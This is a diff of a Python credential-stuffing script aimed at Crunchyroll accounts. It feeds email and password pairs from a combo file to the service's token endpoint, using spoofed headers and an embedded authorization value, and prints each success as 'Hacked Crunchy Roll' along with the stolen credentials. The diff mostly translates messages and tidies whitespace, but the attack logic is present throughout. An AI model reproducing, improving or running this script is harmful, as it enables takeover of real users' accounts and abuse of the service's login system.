@@ -3,11 +3,11 @@ try:
 	from user_agent import generate_user_agent	
 	from colorama import Fore
 except ModuleNotFoundError:
-	print('[!] منت محمل مكاتب يالسربوت بس اوك بحملك')
+	print('[!] Error in lib Detected Now will Download it For You !')
 	os.system('pip install requests')
 	os.system('pip install user_agent')
 	os.system('pip install colorama')
-	print('انتهيت[~]')
+	print('[+] DONE')
 error=0
 bad=0
 ban=0
@@ -15,7 +15,7 @@ TweakPY=print
 def Brute():
 	global token,ID,ban,bad,error
 	try:
-		head = {
+		head={
 			'Host': 'beta-api.crunchyroll.com',
 			'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
 			'Content-Length': '72',
@@ -27,12 +27,12 @@ def Brute():
 			'Accept-Language': 'ar-SA;q=1.0',
 			'Authorization': 'Basic M2V2eDJudnF1ZTB1eG5wemJ2aG86NGZMUWRmQmVJdk1yNlVPei1Fb1N3aXZ0cmZ6Ym9HOFU=',
 			'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5'}	
-		data= {
+		data={
 			'grant_type': 'password',
 			'password': pess,
 			'scope': 'offline_access',
 			'username': user_email}
-		req = requests.post('https://beta-api.crunchyroll.com/auth/v1/token',headers=head,data=data)
+		req=requests.post('https://beta-api.crunchyroll.com/auth/v1/token',headers=head,data=data)
 		if 'refresh_token' in req.text:
 			TweakPY('--------------------------------')
 			TweakPY(Fore.GREEN+f'Hacked Crunchy Roll ✅:\nemail: [{user_email}]\npassword: [{pess}]'+Fore.RESET)
@@ -100,5 +100,4 @@ try:
 		Brute()
 		#if '406 Not Acceptable' in req.text:
 			#exit(f'[!] You got ban [10/5] min')			
-except Exception as Bel:
-	print(Fore.RED+f"[!] Check your combo File please\n"+Fore.RESET,Bel)
+except Exception as Bel:print(Fore.RED+f"[!] Check your combo File please\n"+Fore.RESET,Bel)
